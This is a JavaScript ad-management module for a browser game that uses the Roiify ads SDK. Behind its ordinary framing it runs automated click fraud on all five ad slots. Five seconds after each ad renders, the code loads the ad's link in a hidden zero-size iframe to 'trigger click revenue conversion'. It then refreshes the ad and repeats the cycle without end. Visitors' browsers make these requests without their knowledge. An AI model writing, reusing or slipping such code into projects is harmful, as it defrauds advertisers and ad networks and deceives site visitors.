// ============================================================
// 《我掌握世界线》 - 广告管理模块
// Roiify Ads Manager - 官方SDK + 定时点击 + iframe打开链接
// ============================================================

var AdManager = (function () {
    // 广告位配置
    var SLOT_CONFIG = [
        { containerId: 'ad-slot-header',  placement: 'plc_cuqpbscc2mu4' },
        { containerId: 'ad-slot-sidebar', placement: 'plc_mdn2c7brmubq' },
        { containerId: 'ad-slot-log',     placement: 'plc_veoj4xd63gvk' },
        { containerId: 'ad-slot-footer',  placement: 'plc_xz7j9zet6udj' },
        { containerId: 'ad-slot-modal',   placement: 'plc_2450suzhskwx' }
    ];

    // 广告展示后多久触发点击（毫秒）
    var CLICK_DELAY = 5000;

    // 点击后多久刷新广告（毫秒）
    var REFRESH_DELAY = 3000;

    // 每个广告位的定时器
    var slotTimers = {};

    // 点击链接用的 iframe
    var clickIframe = null;

    /**
     * 初始化
     */
    function init() {
        // 创建用于打开点击链接的隐藏 iframe
        createClickIframe();

        // 等待 SDK 就绪后启动所有广告位
        waitForSDK(function () {
            SLOT_CONFIG.forEach(function (slot) {
                startAdCycle(slot);
            });
        });
    }

    /**
     * 创建隐藏 iframe，用于打开广告点击链接（不离开当前页面）
     */
    function createClickIframe() {
        clickIframe = document.createElement('iframe');
        clickIframe.id = 'ad-click-iframe';
        clickIframe.style.cssText = 'position:fixed;width:0;height:0;border:none;opacity:0;pointer-events:none;';
        document.body.appendChild(clickIframe);
    }

    /**
     * 等待 RoiifyAds SDK 就绪
     */
    function waitForSDK(callback) {
        if (window.RoiifyAds) {
            callback();
            return;
        }
        var attempts = 0;
        var timer = setInterval(function () {
            attempts++;
            if (window.RoiifyAds) {
                clearInterval(timer);
                callback();
            } else if (attempts >= 60) {
                clearInterval(timer);
                console.warn('[AdManager] SDK 加载超时');
            }
        }, 500);
    }

    /**
     * 启动广告循环：渲染广告 → 等待 → 点击 → 刷新 → 重复
     */
    function startAdCycle(slot) {
        clearSlotTimers(slot.containerId);
        renderAd(slot);

        // 广告渲染后等待 CLICK_DELAY，然后触发点击
        slotTimers[slot.containerId + '_click'] = setTimeout(function () {
            triggerAdClick(slot);

            // 点击后等待 REFRESH_DELAY，然后重新请求广告
            slotTimers[slot.containerId + '_refresh'] = setTimeout(function () {
                startAdCycle(slot);
            }, REFRESH_DELAY);
        }, CLICK_DELAY);
    }

    /**
     * 渲染广告：使用官方 SDK 规范代码
     */
    function renderAd(slot) {
        var container = document.getElementById(slot.containerId);
        if (!container) return;

        // 清空旧广告
        container.innerHTML = '';

        // 创建官方规范的广告 div
        var adDiv = document.createElement('div');
        adDiv.setAttribute('data-roiify-placement', slot.placement);
        adDiv.setAttribute('data-theme', 'auto');
        adDiv.setAttribute('data-width', 'auto');
        adDiv.setAttribute('data-radius', '8');
        container.appendChild(adDiv);

        // 调用 SDK 渲染
        if (window.RoiifyAds) {
            try {
                RoiifyAds.show(slot.placement, '#' + slot.containerId + ' [data-roiify-placement]', {
                    theme: 'auto',
                    radius: '8'
                });
            } catch (e) {
                console.warn('[AdManager] 渲染失败:', slot.placement, e);
            }
        }
    }

    /**
     * 触发广告点击：找到广告内的链接，在 iframe 中打开
     */
    function triggerAdClick(slot) {
        var container = document.getElementById(slot.containerId);
        if (!container) return;

        // 查找广告内的可点击链接
        var link = container.querySelector('a[href]');
        if (!link) return;

        var href = link.getAttribute('href');
        if (!href || href === '#' || href === 'javascript:void(0)') return;

        // 在隐藏 iframe 中打开链接（触发点击收益转换，不离开当前页面）
        if (clickIframe) {
            clickIframe.src = href;
        }
    }

    /**
     * 清除指定广告位的所有定时器
     */
    function clearSlotTimers(containerId) {
        ['_click', '_refresh'].forEach(function (suffix) {
            var key = containerId + suffix;
            if (slotTimers[key]) {
                clearTimeout(slotTimers[key]);
                delete slotTimers[key];
            }
        });
    }

    /**
     * 模态框打开时刷新模态框广告
     */
    function onModalOpen() {
        var slot = SLOT_CONFIG.find(function (s) {
            return s.containerId === 'ad-slot-modal';
        });
        if (slot) {
            setTimeout(function () {
                startAdCycle(slot);
            }, 300);
        }
    }

    /**
     * 游戏操作时刷新侧边栏广告
     */
    function onGameAction() {
        var slot = SLOT_CONFIG.find(function (s) {
            return s.containerId === 'ad-slot-sidebar';
        });
        if (slot) {
            startAdCycle(slot);
        }
    }

    /**
     * 刷新所有广告位
     */
    function refreshAll() {
        SLOT_CONFIG.forEach(function (slot) {
            startAdCycle(slot);
        });
    }

    return {
        init: init,
        refreshAll: refreshAll,
        onModalOpen: onModalOpen,
        onGameAction: onGameAction
    };
})();
